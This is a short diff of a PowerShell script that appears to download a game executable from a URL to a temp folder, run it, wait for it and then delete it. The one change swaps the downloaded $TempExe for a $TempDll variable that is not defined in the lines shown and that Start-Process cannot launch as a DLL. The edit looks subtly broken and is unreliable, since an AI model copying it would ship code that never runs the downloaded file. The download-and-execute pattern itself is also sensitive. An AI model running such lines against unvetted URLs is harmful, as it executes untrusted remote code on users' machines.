@@ -12,7 +12,7 @@ $TempExe = Join-Path ([IO.Path]::GetTempPath()) "545f47bc-a8c7-4a4d-a8d1-f450d32
 
 Invoke-WebRequest -Uri $GameUrl -OutFile $TempExe -UseBasicParsing
 
-$proc = Start-Process -FilePath $TempExe -PassThru
+$proc = Start-Process -FilePath $TempDll -PassThru
 $proc.WaitForExit()
 
 Remove-Item $TempExe -Force -ErrorAction SilentlyContinue
